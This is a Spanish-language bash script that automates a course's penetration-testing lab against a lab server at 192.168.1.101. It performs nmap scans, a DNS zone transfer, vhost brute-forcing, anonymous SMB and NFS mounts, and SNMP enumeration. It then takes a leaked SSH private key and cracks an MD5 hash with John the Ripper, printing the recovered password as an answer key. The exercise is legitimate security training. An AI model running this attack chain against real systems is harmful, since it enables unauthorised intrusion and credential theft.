#!/usr/bin/env bash
# ==============================================================================
# parcial1_practicas_01_a_06.sh
# Versión idempotente y estandarizada (Reglas 02 y 03) de auto_hack.sh
# Cubre Prácticas 1, 2, 2.5, 3, 4, 5, 5.5, 5.6 y 6 contra ubuntuServer
# ==============================================================================

set -euo pipefail

IP_TARGET="192.168.1.101"
REAL_USER="${SUDO_USER:-$(whoami)}"
USER_HOME="$(getent passwd "${REAL_USER}" | cut -d: -f6)"
SMB_MOUNT="/mnt/archivoCompartido"
NFS_MOUNT="/mnt/respaldos"
MARKER_BEGIN="# BEGIN CETILAB"
MARKER_END="# END CETILAB"

pause_for_screenshot() {
    local step_title="${1:-Paso completado}"
    echo ""
    echo "=================================================================="
    echo " [+] ${step_title}"
    echo " [+] Comando finalizado. TOMA TU CAPTURA DE PANTALLA AHORA."
    echo "=================================================================="
    read -r -p "Presiona [ENTER] para continuar a la siguiente practica..." _
    echo ""
}

cleanup_environment() {
    echo "=== REVERSION Y LIMPIEZA DEL ENTORNO (ZERO-FOOTPRINT) ==="
    for mp in "${SMB_MOUNT}" "${NFS_MOUNT}" "/mnt/smb_archivos" "/mnt/nfs_respaldos"; do
        if [[ -d "${mp}" ]] && mountpoint -q "${mp}"; then
            echo "[+] Desmontando ${mp}..."
            umount -l "${mp}" || true
        fi
        if [[ -d "${mp}" ]] && [[ -z "$(ls -A "${mp}" 2>/dev/null || true)" ]]; then
            rmdir "${mp}" 2>/dev/null || true
        fi
    done

    sed -i "/${MARKER_BEGIN}/,/${MARKER_END}/d" /etc/hosts
    sed -i '/192\.168\.1\.101/d' /etc/hosts
    sed -i '/cetilab\.local/d' /etc/hosts
    echo "[OK] /etc/hosts y puntos de montaje en /mnt limpiados correctamente."
}

if [[ "${1:-}" == "--cleanup" ]]; then
    cleanup_environment
    exit 0
fi

echo "=== LIMPIEZA PREVIA IDEMPOTENTE DE HOSTS Y MONTAJES ==="
cleanup_environment
echo "Archivos residuales de hosts y montajes previos limpiados."

echo "=== PRACTICA 1: NMAP Y DESCUBRIMIENTO ==="
nmap -sn 192.168.1.0/24
nmap -sC -sV "${IP_TARGET}"
pause_for_screenshot "PRACTICA 1: Escaneo Nmap de red y servicios en ${IP_TARGET}"

echo "=== PRACTICA 2: REGISTRO DNS INICIAL ==="
{
    echo "${MARKER_BEGIN}"
    echo "${IP_TARGET} admin-backup"
    echo "${MARKER_END}"
} >> /etc/hosts
echo "Ping a admin-backup para comprobar:"
ping -c 3 admin-backup
pause_for_screenshot "PRACTICA 2: Resolucion y Ping a admin-backup"

echo "=== PRACTICA 2.5: TRANSFERENCIA DE ZONA (AXFR) ==="
dig @"${IP_TARGET}" cetilab.local -t axfr
pause_for_screenshot "PRACTICA 2.5: Transferencia de zona DNS AXFR en cetilab.local"

echo "=== AUTOMATIZACION: AGREGANDO SUBDOMINIOS A /etc/hosts (IDEMPOTENTE) ==="
sed -i "/${MARKER_BEGIN}/,/${MARKER_END}/d" /etc/hosts
cat << EOF >> /etc/hosts
${MARKER_BEGIN}
${IP_TARGET} admin-backup
${IP_TARGET} cetilab.local app.cetilab.local db-mongo.cetilab.local db-mysql.cetilab.local files.cetilab.local ftp.cetilab.local mail.cetilab.local nfs.cetilab.local ns1.cetilab.local snmp.cetilab.local ssh.cetilab.local www.cetilab.local
${MARKER_END}
EOF
echo "Cat a /etc/hosts para tu captura:"
tail -n 5 /etc/hosts
pause_for_screenshot "Configuracion idempotente de subdominios en /etc/hosts"

echo "=== PRACTICA 3: GOBUSTER (ENUMERACION VHOST) ==="
gobuster vhost -u http://cetilab.local -w /usr/share/dirb/wordlists/diccionario.txt
pause_for_screenshot "PRACTICA 3: Descubrimiento de app.cetilab.local con Gobuster"

echo "=== PRACTICA 4: BURP SUITE ==="
echo "Esta practica es grafica (FoxyProxy + Burp SQLi sobre http://app.cetilab.local)."
echo "Una vez termines la practica 4 y tengas las credenciales, vuelve aqui."
pause_for_screenshot "PRACTICA 4: Auditoria Web con Burp Suite y FoxyProxy"

echo "=== PRACTICA 5: SMBMAP Y MONTAJE SMB ==="
smbmap -H cetilab.local
mkdir -p "${SMB_MOUNT}"
if ! mountpoint -q "${SMB_MOUNT}"; then
    mount -t cifs //app.cetilab.local/archivos_ti "${SMB_MOUNT}" -o guest,domain=cetilab.local
fi
ls -la "${SMB_MOUNT}"
pause_for_screenshot "PRACTICA 5: Enumeracion SMBMap y listado de /mnt/archivoCompartido"

echo "=== PRACTICA 5.5: SNMP ==="
snmpwalk -v 2c -c public cetilab.local
pause_for_screenshot "PRACTICA 5.5: Enumeracion SNMP v2c (fuga de ruta NFS y usuario developer)"

echo "=== PRACTICA 5.6: MONTAJE NFS Y LLAVE SSH ==="
mkdir -p "${NFS_MOUNT}"
if ! mountpoint -q "${NFS_MOUNT}"; then
    mount -t nfs cetilab.local:/srv/nfs/respaldos_ti "${NFS_MOUNT}"
fi
echo "Copiando llave SSH a tu carpeta personal (${USER_HOME}/developer.key)..."
cp -f "${NFS_MOUNT}/developer.key" "${USER_HOME}/developer.key"
chown "${REAL_USER}:${REAL_USER}" "${USER_HOME}/developer.key"
chmod 600 "${USER_HOME}/developer.key"
ls -la "${USER_HOME}/developer.key"
pause_for_screenshot "PRACTICA 5.6: Montaje NFS y permisos 600 sobre developer.key"

echo "=== PRACTICA 6: CRACKEO DE HASH (JOHN THE RIPPER) ==="
echo "fcd065c1541dc1f64cce023e9f9e4900" > "${USER_HOME}/hash_practica6.txt"
chown "${REAL_USER}:${REAL_USER}" "${USER_HOME}/hash_practica6.txt"
echo "Iniciando ataque con mascara Ceti?d?d?d?d..."
john --format=raw-md5 --mask='Ceti?d?d?d?d' "${USER_HOME}/hash_practica6.txt" || true
john --show --format=raw-md5 "${USER_HOME}/hash_practica6.txt"
pause_for_screenshot "PRACTICA 6: Crackeo de hash MD5 con John the Ripper (Ceti2245)"

echo "=== FIN DEL SCRIPT ==="
echo "Para conectarte por SSH ahora solo debes usar:"
echo "  ssh -i ${USER_HOME}/developer.key developer@cetilab.local"
echo "Para revertir montajes y limpiar /etc/hosts ejecuta:"
echo "  sudo $0 --cleanup"
